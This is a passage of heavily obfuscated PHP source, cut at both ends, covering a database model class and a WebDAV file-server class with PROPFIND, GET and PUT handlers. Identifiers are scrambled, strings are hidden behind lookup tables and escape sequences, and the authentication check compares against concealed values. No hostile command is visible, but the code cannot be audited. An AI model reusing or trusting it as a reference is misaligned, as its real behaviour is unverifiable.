‚è = mb_strlen($cœÊ›ğ¤, $aºè£õ‡§[326]); if (strpos($eËõø¾åÙÑ, $aºè£õ‡§[47])) { list($BôËÄŠ§Ğ, $b—ïõ™¿Êô) = explode($aºè£õ‡§[47], $eËõø¾åÙÑ); return $cÛÍ  ‚è >= $BôËÄŠ§Ğ && $cÛÍ  ‚è <= $b—ïõ™¿Êô; } else { return $cÛÍ  ‚è == $eËõø¾åÙÑ; } case $aºè£õ‡§[327]: list($Cåçé¥ğß, $eæ÷ø¸‰µë) = explode($aºè£õ‡§[47], $eËõø¾åÙÑ); if (!is_numeric($Cåçé¥ğß)) { $Cåçé¥ğß = strtotime($Cåçé¥ğß); } if (!is_numeric($eæ÷ø¸‰µë)) { $eæ÷ø¸‰µë = strtotime($eæ÷ø¸‰µë); } return NOW_TIME >= $Cåçé¥ğß && NOW_TIME <= $eæ÷ø¸‰µë; case $aºè£õ‡§[328]: return in_array(get_client_ip(), explode($aºè£õ‡§[47], $eËõø¾åÙÑ)); case $aºè£õ‡§[329]: return !in_array(get_client_ip(), explode($aºè£õ‡§[47], $eËõø¾åÙÑ)); case $aºè£õ‡§[316]: default: return $this->regex($cœÊ›ğ¤, $eËõø¾åÙÑ); } } public function query($aˆã„Â¨‹ù, $C´Øİ¥ß÷ = false) { $d‹›­Î’ßŸ =& $_SERVER[í™]; if (!is_bool($C´Øİ¥ß÷) && !is_array($C´Øİ¥ß÷)) { $C´Øİ¥ß÷ = func_get_args(); array_shift($C´Øİ¥ß÷); } $aˆã„Â¨‹ù = str_replace(array($d‹›­Î’ßŸ[217], $d‹›­Î’ßŸ[330]), $d‹›­Î’ßŸ[50], $aˆã„Â¨‹ù); $aˆã„Â¨‹ù = $this->parseSql($aˆã„Â¨‹ù, $C´Øİ¥ß÷); return $this->db->query($aˆã„Â¨‹ù); } public function execute($D£ò„˜¢ö, $F‘î£ÌÑÒğ = false) { if (!is_bool($F‘î£ÌÑÒğ) && !is_array($F‘î£ÌÑÒğ)) { $F‘î£ÌÑÒğ = func_get_args(); array_shift($F‘î£ÌÑÒğ); } $D£ò„˜¢ö = $this->parseSql($D£ò„˜¢ö, $F‘î£ÌÑÒğ); return $this->db->execute($D£ò„˜¢ö); } protected function parseSql($c¨»Ó¿„‡×, $B™ê¢ÆîŞ‘) { $FòÖ†ò¸ßÚ =& $_SERVER[í™]; if (!0 === $B™ê¢ÆîŞ‘) { $dÖ—ƒ¤Èò¨ = $this->_parseOptions(); $c¨»Ó¿„‡× = $this->db->parseSql($c¨»Ó¿„‡×, $dÖ—ƒ¤Èò¨); } elseif (is_array($B™ê¢ÆîŞ‘)) { $B™ê¢ÆîŞ‘ = array_map(array($this->db, $FòÖ†ò¸ßÚ[331]), $B™ê¢ÆîŞ‘); $c¨»Ó¿„‡× = vsprintf($c¨»Ó¿„‡×, $B™ê¢ÆîŞ‘); } else { $c¨»Ó¿„‡× = strtr($c¨»Ó¿„‡×, array($FòÖ†ò¸ßÚ[332] => $this->getTableName(), $FòÖ†ò¸ßÚ[333] => think_config($FòÖ†ò¸ßÚ[232]))); } $this->db->setModel($this->name); return $c¨»Ó¿„‡×; } public function db($cº–‹Íô—“ = '', $aå†ì³¨µŠ = '', $föÌˆ¨ºŠ = array()) { goto D¼ÁœìŒÅŠ; D¼ÁœìŒÅŠ: $cÛšë°À¤Š =& $_SERVER[í™]; if ($cÛšë°À¤Š[33] === $cº–‹Íô—“ && $this->db) { return $this->db; } static $f–½ƒÄ¸‹ = array(); goto dÈÀ…”Ä‚; dÈÀ…”Ä‚: static $aò—¡Í¡‘ = array(); if (!isset($aò—¡Í¡‘[$cº–‹Íô—“]) || isset($aò—¡Í¡‘[$cº–‹Íô—“]) && $aå†ì³¨µŠ && $f–½ƒÄ¸‹[$cº–‹Íô—“] != $aå†ì³¨µŠ) { if (!empty($aå†ì³¨µŠ) && is_string($aå†ì³¨µŠ) && !1 === strpos($aå†ì³¨µŠ, $cÛšë°À¤Š[8])) { $aå†ì³¨µŠ = think_config($aå†ì³¨µŠ); } $aò—¡Í¡‘[$cº–‹Íô—“] = Db::getInstance($aå†ì³¨µŠ); } elseif (NULL === $aå†ì³¨µŠ) { $aò—¡Í¡‘[$cº–‹Íô—“]->close(); unset($aò—¡Í¡‘[$cº–‹Íô—“]); return; } if (!empty($föÌˆ¨ºŠ)) { if (is_string($föÌˆ¨ºŠ)) { parse_str($föÌˆ¨ºŠ, $föÌˆ¨ºŠ); } foreach ($föÌˆ¨ºŠ as $DÖ¢Ã­åÉ¯ => $bñìÔØàğ) { $this->setProperty($DÖ¢Ã­åÉ¯, $bñìÔØàğ); } } goto a‚‚ùŠ·ª¥; a‚‚ùŠ·ª¥: $f–½ƒÄ¸‹[$cº–‹Íô—“] = $aå†ì³¨µŠ; $this->db = $aò—¡Í¡‘[$cº–‹Íô—“]; $this->_after_db(); goto BæÇÅƒù·â; BæÇÅƒù·â: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto F²ƒ‡“„; F²ƒ‡“„: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $e¿ÅôÌôÎà = get_class($this); if ($e¿ÅôÌôÎà == $_SERVER[í™][334]) { return $this->name; } $this->name = substr($e¿ÅôÌôÎà, 0, -5); } return $this->name; } public function getTableName() { $F«„ÃËàº§ =& $_SERVER[í™]; if (empty($this->trueTableName)) { $eù¢Šâó¸ = !empty($this->tablePrefix) ? $this->tablePrefix : $F«„ÃËàº§[33]; if (!empty($this->tableName)) { $eù¢Šâó¸ .= $this->tableName; } else { $eù¢Šâó¸ .= think_parse_name($this->name); } $this->trueTableName = strtolower($eù¢Šâó¸); } return (!empty($this->dbName) ? $this->dbName . $F«„ÃËàº§[91] : $F«„ÃËàº§[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $e¢ÜÓÂÌÒ— =& $_SERVER[í™]; return isset($this->fields[$e¢ÜÓÂÌÒ—[239]]) ? $this->fields[$e¢ÜÓÂÌÒ—[239]] : $this->pk; } public function getDbFields() { $B–äòí°‘ =& $_SERVER[í™]; if (isset($this->options[$B–äòí°‘[267]])) { $B…»¸ğÇÌš = $this->db->getFields($this->options[$B–äòí°‘[267]]); return $B…»¸ğÇÌš ? array_keys($B…»¸ğÇÌš) : !1; } if ($this->fields) { $B…»¸ğÇÌš = $this->fields; unset($B…»¸ğÇÌš[$B–äòí°‘[238]], $B…»¸ğÇÌš[$B–äòí°‘[239]], $B…»¸ğÇÌš[$B–äòí°‘[240]], $B…»¸ğÇÌš[$B–äòí°‘[237]]); return $B…»¸ğÇÌš; } return !1; } public function data($câÉøÄŠ‹ = '') { $f‘ ¾Ÿ»¡Ü =& $_SERVER[í™]; if ($f‘ ¾Ÿ»¡Ü[33] === $câÉøÄŠ‹ && !empty($this->data)) { return $this->data; } if (is_object($câÉøÄŠ‹)) { $câÉøÄŠ‹ = get_object_vars($câÉøÄŠ‹); } elseif (is_string($câÉøÄŠ‹)) { parse_str($câÉøÄŠ‹, $câÉøÄŠ‹); } elseif (!is_array($câÉøÄŠ‹)) { think_exception(think_lang($f‘ ¾Ÿ»¡Ü[259])); } $this->data = $câÉøÄŠ‹; return $this; } public function join($D¨å÷¤¶²) { $F‡†¢ ¥Ï =& $_SERVER[í™]; if (is_array($D¨å÷¤¶²)) { $this->options[$F‡†¢ ¥Ï[270]] = $D¨å÷¤¶²; } elseif (!empty($D¨å÷¤¶²)) { $this->options[$F‡†¢ ¥Ï[270]][] = $D¨å÷¤¶²; } return $this; } public function union($b„‰®°èêË, $a”¡ ¿¤ù = false) { goto d›°ÃéÔ; f‰ãß’ËŞÛ: return $this; goto DóŒËŸ¶Ì¯; eÔãšƒˆˆ×: if (is_object($b„‰®°èêË)) { $b„‰®°èêË = get_object_vars($b„‰®°èêË); } if (is_string($b„‰®°èêË)) { $Cà‚××Î¹Ú = $b„‰®°èêË; } elseif (is_array($b„‰®°èêË)) { if (isset($b„‰®°èêË[0])) { $this->options[$BµÊ›‚ì©–[335]] = array_merge($this->options[$BµÊ›‚ì©–[335]], $b„‰®°èêË); return $this; } else { $Cà‚××Î¹Ú = $b„‰®°èêË; } } else { think_exception(think_lang($BµÊ›‚ì©–[259])); } $this->options[$BµÊ›‚ì©–[335]][] = $Cà‚××Î¹Ú; goto f‰ãß’ËŞÛ; d›°ÃéÔ: $BµÊ›‚ì©– =& $_SERVER[í™]; if (empty($b„‰®°èêË)) { return $this; } if ($a”¡ ¿¤ù) { $this->options[$BµÊ›‚ì©–[335]][$BµÊ›‚ì©–[336]] = !0; } goto eÔãšƒˆˆ×; DóŒËŸ¶Ì¯: } public function cache($dÈ×¤±ÀÌ« = true, $F¸Ê¹Óêä› = null, $dªçñ½¿Ğ = '') { $c¶¾ñô¢‚ =& $_SERVER[í™]; if (!1 !== $dÈ×¤±ÀÌ«) { $this->options[$c¶¾ñô¢‚[337]] = array($c¶¾ñô¢‚[89] => $dÈ×¤±ÀÌ«, $c¶¾ñô¢‚[327] => $F¸Ê¹Óêä›, $c¶¾ñô¢‚[29] => $dªçñ½¿Ğ); } return $this; } public function field($Eé…Ããá, $aêßé²¡˜† = false) { $f¡ó¶¶ò—œ =& $_SERVER[í™]; if (!0 === $Eé…Ããá) { $D¦‹Ü›äÇÑ = $this->getDbFields(); $Eé…Ããá = $D¦‹Ü›äÇÑ ? $D¦‹Ü›äÇÑ : $f¡ó¶¶ò—œ[176]; } elseif ($aêßé²¡˜†) { if (is_string($Eé…Ããá)) { $Eé…Ããá = explode($f¡ó¶¶ò—œ[47], $Eé…Ããá); } $D¦‹Ü›äÇÑ = $this->getDbFields(); $Eé…Ããá = $D¦‹Ü›äÇÑ ? array_diff($D¦‹Ü›äÇÑ, $Eé…Ããá) : $Eé…Ããá; } $this->options[$f¡ó¶¶ò—œ[261]] = $Eé…Ããá; return $this; } public function scope($C·ŞÈ«°˜ = '', $A´Èò´Âã = NULL) { $FµáäŒ¯Î¿ =& $_SERVER[í™]; if ($FµáäŒ¯Î¿[33] === $C·ŞÈ«°˜) { if (isset($this->_scope[$FµáäŒ¯Î¿[34]])) { $c¤‡Ò‡‹„× = $this->_scope[$FµáäŒ¯Î¿[34]]; } else { return $this; } } elseif (is_string($C·ŞÈ«°˜)) { $Bíá¢ •Ê„ = explode($FµáäŒ¯Î¿[47], $C·ŞÈ«°˜); $c¤‡Ò‡‹„× = array(); foreach ($Bíá¢ •Ê„ as $dËœ“Ÿª) { if (!isset($this->_scope[$dËœ“Ÿª])) { continue; } $c¤‡Ò‡‹„× = array_merge($c¤‡Ò‡‹„×, $this->_scope[$dËœ“Ÿª]); } if (!empty($A´Èò´Âã) && is_array($A´Èò´Âã)) { $c¤‡Ò‡‹„× = array_merge($c¤‡Ò‡‹„×, $A´Èò´Âã); } } elseif (is_array($C·ŞÈ«°˜)) { $c¤‡Ò‡‹„× = $C·ŞÈ«°˜; } if (is_array($c¤‡Ò‡‹„×) && !empty($c¤‡Ò‡‹„×)) { $this->options = array_merge($this->options, array_change_key_case($c¤‡Ò‡‹„×)); } return $this; } public function where($BÖÌŠ¦å„¬, $B„ƒ§™Œ°ğ = null) { $cùó¬šŠÌ• =& $_SERVER[í™]; if (!is_null($B„ƒ§™Œ°ğ) && is_string($BÖÌŠ¦å„¬)) { if (!is_array($B„ƒ§™Œ°ğ)) { $B„ƒ§™Œ°ğ = func_get_args(); array_shift($B„ƒ§™Œ°ğ); } $B„ƒ§™Œ°ğ = array_map(array($this->db, $cùó¬šŠÌ•[331]), $B„ƒ§™Œ°ğ); $BÖÌŠ¦å„¬ = vsprintf($BÖÌŠ¦å„¬, $B„ƒ§™Œ°ğ); } elseif (is_object($BÖÌŠ¦å„¬)) { $BÖÌŠ¦å„¬ = get_object_vars($BÖÌŠ¦å„¬); } elseif (is_array($BÖÌŠ¦å„¬)) { foreach ($BÖÌŠ¦å„¬ as $f±æÛŒ›°¯ => $Bê¶ŞÎÙåã) { if ((is_numeric($f±æÛŒ›°¯) || !$f±æÛŒ›°¯) && is_string($Bê¶ŞÎÙåã)) { think_trace($cùó¬šŠÌ•[338], $cùó¬šŠÌ•[33], $cùó¬šŠÌ•[46]); die; } } } if (is_string($BÖÌŠ¦å„¬) && $cùó¬šŠÌ•[33] != $BÖÌŠ¦å„¬) { $f¹ˆ‹’±µ¼ = array(); $f¹ˆ‹’±µ¼[$cùó¬šŠÌ•[339]] = $BÖÌŠ¦å„¬; $BÖÌŠ¦å„¬ = $f¹ˆ‹’±µ¼; } if (isset($this->options[$cùó¬šŠÌ•[263]])) { $this->options[$cùó¬šŠÌ•[263]] = array_merge($this->options[$cùó¬šŠÌ•[263]], $BÖÌŠ¦å„¬); } else { $this->options[$cùó¬šŠÌ•[263]] = $BÖÌŠ¦å„¬; } return $this; } public function limit($dÁİ¾å‰, $E˜†ù·‡›Õ = null) { $dœ‰Â·¬‘´ =& $_SERVER[í™]; $this->options[$dœ‰Â·¬‘´[280]] = is_null($E˜†ù·‡›Õ) ? $dÁİ¾å‰ : $dÁİ¾å‰ . $dœ‰Â·¬‘´[47] . $E˜†ù·‡›Õ; return $this; } public function page($e½ôÒ˜ñŸò, $CŸÜ«‚èÕ¢ = null) { $BçõáÌ¢ä =& $_SERVER[í™]; $this->options[$BçõáÌ¢ä[340]] = is_null($CŸÜ«‚èÕ¢) ? $e½ôÒ˜ñŸò : $e½ôÒ˜ñŸò . $BçõáÌ¢ä[47] . $CŸÜ«‚èÕ¢; return $this; } public function comment($E£Æí¸ØÊ·) { $this->options[$_SERVER[í™][341]] = $E£Æí¸ØÊ·; return $this; } public function setProperty($cªÂ²‰ôÚ‹, $Dáí˜ƒ‰©) { if (property_exists($this, $cªÂ²‰ôÚ‹)) { $this->{$cªÂ²‰ôÚ‹} = $Dáí˜ƒ‰©; } return $this; } } goto Eï”Ä¢ä­Š; bëá„Ç¿Ñ¶: class HttpDavServer { public function __construct($b­•‡‰¬š½, $bÒŸ£Ò‘éÙ) { $this->root = $b­•‡‰¬š½; $this->initPath($bÒŸ£Ò‘éÙ); $this->start(); } public function initPath($C²ªµá”Ã‹) { $eæÏğ²ğÄ“ =& $_SERVER[í™]; $D»×‚—Ø‚“ = rtrim($_SERVER[$eæÏğ²ğÄ“[1374]], $eæÏğ²ğÄ“[8]) . $eæÏğ²ğÄ“[8]; $this->urlBase = substr($D»×‚—Ø‚“, 0, strpos($D»×‚—Ø‚“, $C²ªµá”Ã‹) + 1); $this->urlBase = rtrim($this->urlBase, $eæÏğ²ğÄ“[8]) . $C²ªµá”Ã‹; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $FºˆéÍÚ¾å =& $_SERVER[í™]; $EÙŠˆİ‡‡Î = HttpAuth::get(); if ($EÙŠˆİ‡‡Î[$FºˆéÍÚ¾å[537]] == $FºˆéÍÚ¾å[1771] && $EÙŠˆİ‡‡Î[$FºˆéÍÚ¾å[882]] == $FºˆéÍÚ¾å[1772]) { return !0; } HttpAuth::error(); } public function start() { goto c±˜ÃóâîÅ; A¤ÈÆ¦”†ò: if (!$e¤÷Ğ§ë) { return; } self::response($e¤÷Ğ§ë); goto DÀ½Íé¸“›; c±˜ÃóâîÅ: $B®‚ÓßéÑ® =& $_SERVER[í™]; $this->checkUser(); $b“å‚°ö‚Ì = $B®‚ÓßéÑ®[144] . HttpHeader::method(); goto CéÇ¢àÓŒÚ; CéÇ¢àÓŒÚ: if (!method_exists($this, $b“å‚°ö‚Ì)) { pr($b“å‚°ö‚Ì . $B®‚ÓßéÑ®[1773]); die; } $e«¹ê¬›‡ = array($B®‚ÓßéÑ®[1774], $B®‚ÓßéÑ®[1775]); if (!in_array($b“å‚°ö‚Ì, $e«¹ê¬›‡) && !$this->pathExists($this->path)) { $e¤÷Ğ§ë = array($B®‚ÓßéÑ®[1018] => 404); } else { $e¤÷Ğ§ë = $this->{$b“å‚°ö‚Ì}(); } goto A¤ÈÆ¦”†ò; DÀ½Íé¸“›: } public function pathGet($c¨×¥Ç®± = false) { $E•İ¡…Î˜ =& $_SERVER[í™]; $døÃôÂ…°Œ = $c¨×¥Ç®± ? $_SERVER[$E•İ¡…Î˜[1776]] : $_SERVER[$E•İ¡…Î˜[1374]]; $døÃôÂ…°Œ = KodIO::clear(rawurldecode($døÃôÂ…°Œ)); if (!strstr($døÃôÂ…°Œ, KodIO::clear($this->urlBase))) { return !1; } return substr($døÃôÂ…°Œ, strpos($døÃôÂ…°Œ, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($aÂğÕ±Ä×») { return file_exists($aÂğÕ±Ä×»); } public function pathMkdir($cÆ÷ŞµŒÍ) { return mkdir($cÆ÷ŞµŒÍ, 511, !0); } public function pathInfo($BèÁ‘Œ‘«) { return path_info($BèÁ‘Œ‘«); } public function pathList($D®Ø»”¥ùğ) { return path_list($D®Ø»”¥ùğ); } public function pathOut($BÉ‹„ã§‡È) { echo file_get_contents($BÉ‹„ã§‡È); } public function pathPut($D”İ«¥Ø‹, $aËñ£çæ¸  = '') { if (!$aËñ£çæ¸ ) { return file_put_contents($D”İ«¥Ø‹, $_SERVER[í™][33]); } return move_path($aËñ£çæ¸ , $D”İ«¥Ø‹); } public function pathRemove($FÛç¤ÔÕ ˆ) { if (is_file($FÛç¤ÔÕ ˆ)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($DÀ‰ùÓî¢, $d´êñ±¶¾µ) { return move_path($DÀ‰ùÓî¢, $d´êñ±¶¾µ); } public function pathCopy($FÆÃêÊÂó”, $C¯ÔãÔ·¸”) { return copy_dir($FÆÃêÊÂó”, $C¯ÔãÔ·¸”); } public function parsePath($dŸ²“âßÓÜ) { return $dŸ²“âßÓÜ; } public function parseItem($d—æ„˜Ãƒœ, $cßÖÏÇ—²ì) { goto C¾½«Ë•¦å; C¾½«Ë•¦å: $e¯¨ìå¥ÒÄ =& $_SERVER[í™]; $eŸš¡Üé‡¼ = $this->pathGet() . $e¯¨ìå¥ÒÄ[8] . $d—æ„˜Ãƒœ[$e¯¨ìå¥ÒÄ[28]]; $eŸš¡Üé‡¼ = $e¯¨ìå¥ÒÄ[8] . str_replace($e¯¨ìå¥ÒÄ[172], $e¯¨ìå¥ÒÄ[8], rawurlencode($eŸš¡Üé‡¼)); goto AÆÖñˆ¶È†; AÆÖñˆ¶È†: if ($cßÖÏÇ—²ì) { $eŸš¡Üé‡¼ = $e¯¨ìå¥ÒÄ[8] . str_replace($e¯¨ìå¥ÒÄ[172], $e¯¨ìå¥ÒÄ[8], rawurlencode($this->pathGet())); } if (!trim($d—æ„˜Ãƒœ[$e¯¨ìå¥ÒÄ[107]])) { $d—æ„˜Ãƒœ[$e¯¨ìå¥ÒÄ[107]] = time(); } if (!trim($d—æ„˜Ãƒœ[$e¯¨ìå¥ÒÄ[187]])) { $d—æ„˜Ãƒœ[$e¯¨ìå¥ÒÄ[187]] = time(); } goto BÓ–êïÀöÏ; BÓ–êïÀöÏ: $aòíá¼ÜÑù = array($e¯¨ìå¥ÒÄ[1777] => KodIO::clear($this->urlBase . $eŸš¡Üé‡¼), $e¯¨ìå¥ÒÄ[107] => @gmdate($e¯¨ìå¥ÒÄ[1778], $d—æ„˜Ãƒœ[$e¯¨ìå¥ÒÄ[107]]), $e¯¨ìå¥ÒÄ[187] => @gmdate($e¯¨ìå¥ÒÄ[1779], $d—æ„˜Ãƒœ[$e¯¨ìå¥ÒÄ[187]]), $e¯¨ìå¥ÒÄ[77] => $d—æ„˜Ãƒœ[$e¯¨ìå¥ÒÄ[77]] ? $d—æ„˜Ãƒœ[$e¯¨ìå¥ÒÄ[77]] : 0); return $aòíá¼ÜÑù; goto BÇğÊ©µÙ; BÇğÊ©µÙ: } public function parseItemXml($b¿«Æ»Œ¡Ş, $F±ïÜØõéÏ) { $aô›ŸÖèì =& $_SERVER[í™]; $BÀ˜­ÚÌ—ë = $this->parseItem($b¿«Æ»Œ¡Ş, $F±ïÜØõéÏ); if ($b¿«Æ»Œ¡Ş[$aô›ŸÖèì[29]] == $aô›ŸÖèì[76]) { $dé“çÀ²Ú‹ = $aô›ŸÖèì[1780]; $dé“çÀ²Ú‹ .= $aô›ŸÖèì[1781]; } else { $AàÕÉ¤ÊèÁ = $b¿«Æ»Œ¡Ş[$aô›ŸÖèì[160]] ? $b¿«Æ»Œ¡Ş[$aô›ŸÖèì[160]] : get_path_ext($b¿«Æ»Œ¡Ş[$aô›ŸÖèì[28]]); $dæÛ×Ô¨±à = get_file_mime($AàÕÉ¤ÊèÁ); $dé“çÀ²Ú‹ = $aô›ŸÖèì[1782]; $dé“çÀ²Ú‹ .= "\74\x44\72\147\x65\164\143\x6f\156\164\x65\x6e\x74\x74\171\x70\x65\76{$dæÛ×Ô¨±à}\x3c\x2f\104\x3a\x67\145\164\x63\x6f\x6e\164\x65\156\x74\x74\x79\x70\x65\x3e"; } return "\12\x9\11\x3c\x44\72\162\x65\x73\160\157\x6e\x73\145\76\12\11\x9\11\74\x44\72\150\162\x65\x66\76{$BÀ˜­ÚÌ—ë[$aô›ŸÖèì[1777]]}\74\57\104\x3a\x68\x72\x65\x66\76\xa\11\x9\x9\74\104\x3a\160\162\x6f\x70\x73\x74\x61\x74\76\xa\x9\x9\x9\11\x3c\104\x3a\x70\162\157\160\x3e\12\x9\x9\x9\11\x9\x3c\x44\x3a\x67\145\x74\154\141\x73\x74\x6d\x6f\144\151\x66\x69\145\x64\76{$BÀ˜­ÚÌ—ë[$aô›ŸÖèì[107]]}\74\57\x44\x3a\x67\x65\x74\x6c\x61\x73\164\155\x6f\144\x69\x66\x69\x65\x64\x3e\xa\11\11\x9\x9\11\74\104\x3a\143\x72\x65\141\164\151\x6f\x6e\x64\141\164\x65\76{$BÀ˜­ÚÌ—ë[$aô›ŸÖèì[187]]}\74\x2f\104\x3a\x63\x72\145\x61\x74\x69\157\x6e\x64\x61\x74\x65\x3e\12\x9\x9\11\x9\x9\74\104\x3a\147\x65\x74\x63\157\156\164\x65\156\164\x6c\x65\156\x67\164\150\x3e{$BÀ˜­ÚÌ—ë[$aô›ŸÖèì[77]]}\74\57\x44\72\x67\x65\164\143\157\x6e\164\145\156\x74\x6c\145\156\147\x74\x68\x3e\xa\11\11\x9\x9\x9{$dé“çÀ²Ú‹}\12\11\x9\11\x9\74\57\104\x3a\160\162\157\160\x3e\xa\11\11\x9\x9\74\104\72\x73\164\x61\164\x75\163\x3e\110\124\124\x50\x2f\x31\56\61\x20\x32\x30\x30\40\117\113\x3c\57\104\72\163\164\141\x74\165\163\x3e\xa\x9\x9\11\74\x2f\104\72\x70\x72\157\160\163\164\141\164\x3e\12\11\11\x3c\57\104\72\x72\145\163\x70\157\x6e\x73\x65\x3e"; } public function pathListMerge($A¼©…ŞĞË») { goto a†£ã„‡á; BŒÈ÷Š¡ÖÁ: $E­±©£¼  = array(); foreach ($A¼©…ŞĞË» as $BÑÅ¦ƒ§ë => $E˜†‹ãÔæ) { if (!in_array($BÑÅ¦ƒ§ë, $Cã³Ëˆø™†) || !is_array($E˜†‹ãÔæ)) { continue; } $E­±©£¼  = array_merge($E­±©£¼ , $E˜†‹ãÔæ); } foreach ($E­±©£¼  as &$f‚øšÛáÊ©) { $f‚øšÛáÊ©[$AĞç½ÖƒÌµ[28]] = str_replace($AĞç½ÖƒÌµ[8], $AĞç½ÖƒÌµ[1376], $f‚øšÛáÊ©[$AĞç½ÖƒÌµ[28]]); } goto Bˆ…‹ÎµÅö; a†£ã„‡á: $AĞç½ÖƒÌµ =& $_SERVER[í™]; if (!$A¼©…ŞĞË») { return $A¼©…ŞĞË»; } $Cã³Ëˆø™† = array($AĞç½ÖƒÌµ[73], $AĞç½ÖƒÌµ[74], $AĞç½ÖƒÌµ[1783]); goto BŒÈ÷Š¡ÖÁ; Bˆ…‹ÎµÅö: return $E­±©£¼ ; goto DÓ©î•Àè¼; DÓ©î•Àè¼: } public function httpPROPFIND() { goto B½»”ÅˆŞˆ; dÃô¿†‡ÌÄ: $C¶Ö»¶³™† = $dš‰·™ğÛ[$aæëŞğ‹¦[1784]]; if (!is_array($e· Ç™ÏöÍ) || $C¶Ö»¶³™†[$aæëŞğ‹¦[1785]] === !1) { return array($aæëŞğ‹¦[1786] => 404, $aæëŞğ‹¦[1787] => $aæëŞğ‹¦[1788]); } $E÷±ÅßŞƒ = $C¶Ö»¶³™†[$aæëŞğ‹¦[29]] == $aæëŞğ‹¦[167] || HttpHeader::get($aæëŞğ‹¦[1763]) == $aæëŞğ‹¦[470]; goto CË£ŸÀİŞÔ; cøÈ‰ùè«¿: return array($aæëŞğ‹¦[1786] => 207, $aæëŞğ‹¦[1787] => "\74\104\72\155\x75\154\x74\151\163\164\141\164\165\x73\x20\x78\155\154\156\x73\72\104\x3d\x22\104\101\x56\72\42\76\xa{$b¼Õ»Ù½Íé}\xa\x3c\57\104\72\155\165\x6c\x74\151\x73\x74\141\x74\x75\x73\76"); goto fƒÉ¥òáµ; CË£ŸÀİŞÔ: if ($E÷±ÅßŞƒ) { $e· Ç™ÏöÍ = array($C¶Ö»¶³™†); } else { $C¶Ö»¶³™†[$aæëŞğ‹¦[28]] = $aæëŞğ‹¦[33]; $e· Ç™ÏöÍ = array_merge(array($C¶Ö»¶³™†), $e· Ç™ÏöÍ); } $b¼Õ»Ù½Íé = $aæëŞğ‹¦[33]; foreach ($e· Ç™ÏöÍ as $Dë¦ù‡øˆ) { $b¼Õ»Ù½Íé .= $this->parseItemXml($Dë¦ù‡øˆ, $E÷±ÅßŞƒ); } goto cøÈ‰ùè«¿; B½»”ÅˆŞˆ: $aæëŞğ‹¦ =& $_SERVER[í™]; $dš‰·™ğÛ = $this->pathList($this->path); $e· Ç™ÏöÍ = $this->pathListMerge($dš‰·™ğÛ); goto dÃô¿†‡ÌÄ; fƒÉ¥òáµ: } public function httpHEAD() { $eóè®ì‚¥ô =& $_SERVER[í™]; $B¼—ÜÕ‡¯ = $this->pathInfo($this->path); if (!$B¼—ÜÕ‡¯ || $B¼—ÜÕ‡¯[$eóè®ì‚¥ô[29]] == $eóè®ì‚¥ô[76]) { return array($eóè®ì‚¥ô[1018] => 200, $eóè®ì‚¥ô[1193] => array($eóè®ì‚¥ô[1789])); } return array($eóè®ì‚¥ô[1018] => 200, $eóè®ì‚¥ô[1193] => array($eóè®ì‚¥ô[1790], $eóè®ì‚¥ô[136], $eóè®ì‚¥ô[1791] . $B¼—ÜÕ‡¯[$eóè®ì‚¥ô[77]], $eóè®ì‚¥ô[1792] . get_file_mime($B¼—ÜÕ‡¯[$eóè®ì‚¥ô[160]]), $eóè®ì‚¥ô[132] . gmdate($eóè®ì‚¥ô[1778], $B¼—ÜÕ‡¯[$eóè®ì‚¥ô[1240]]) . $eóè®ì‚¥ô[1793], $eóè®ì‚¥ô[1794])); } public function httpOPTIONS() { $C«éÑ¦ÎÓ =& $_SERVER[í™]; return array($C«éÑ¦ÎÓ[1018] => 200, $C«éÑ¦ÎÓ[1193] => array($C«éÑ¦ÎÓ[1795], $C«éÑ¦ÎÓ[1796], $C«éÑ¦ÎÓ[1797], $C«éÑ¦ÎÓ[1249])); } public function httpPROPPATCH() { $EÁ¹å½•î =& $_SERVER[í™]; $CõŸ›§à® = $EÁ¹å½•î[1798] . $_SERVER[$EÁ¹å½•î[1374]] . $EÁ¹å½•î[1799]; return array($EÁ¹å½•î[1786] => 207, $EÁ¹å½•î[1787] => "\74\x44\72\155\165\x6c\x74\151\x73\164\x61\164\165\x73\40\x78\155\x6c\156\x73\x3a\x44\x3d\42\x44\x41\126\72\42\x3e\xa{$CõŸ›§à®}\xa\x3c\57\104\x3a\155\165\154\x74\x69\163\164\x61\164\165\x73\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $CÏµ§Û¸¬Ç =& $_SERVER[í™]; $A®Îß§¡Ë = $this->uploadFile(); if ($A®Îß§¡Ë) { $f¼®„ç‡Ì¤ = 204; } else { $A®Îß§¡Ë = $CÏµ§Û¸¬Ç[33]; $f¼®„ç‡Ì¤ = 201; } $C¢Ù²„¹„Â = $this->pathPut($this->path, $A®Îß§¡Ë); if ($C¢Ù²„¹„Â == !1) { $f¼®„ç‡Ì¤ = 404; } return array($CÏµ§Û¸¬Ç[1786] => $f¼®„ç‡Ì¤); } private function uploadFile() { goto fÒ‰¼ƒ¡’å; AÆÛ›Î§‚ª: while (!feof($dÙ›ìùØÉ)) { fwrite($fŞ‹á­­Ãâ, fread($dÙ›ìùØÉ, 1024 * 200)); } fclose($dÙ›ìùØÉ); fclose($fŞ‹á­­Ãâ); goto eêöƒ£èî›; fÒ‰¼ƒ¡’å: $f«åé÷´Øâ =& $_SERVER[í™]; @mk_dir(TEMP_FILES); $Fº‹†î¨È« = TEMP_FILES . $f«åé÷´Øâ[1800] . rand_string(32); goto e²ëŒğ­é³; e²ëŒğ­é³: $fŞ‹á­­Ãâ = @fopen($Fº‹†î¨È«, $f«åé÷´Øâ[1508]); $dÙ›ìùØÉ = @fopen($f«åé÷´Øâ[1801], $f«åé÷´Øâ[1507]); if (!$dÙ›ìùØÉ || !$fŞ‹á­­Ãâ) { @unlink($Fº‹†î¨È«); return !1; } goto AÆÛ›Î§‚ª; eêöƒ£èî›: if (@filesize($Fº‹†î¨È«) > 0) { return $Fº‹†î¨È«; } @unlink($Fº‹†î¨È«); return !1; goto Fğî§Ñ„ßã; Fğî§Ñ„ßã: } public function httpMKCOL() { $bÜÀèñ¡”ë =& 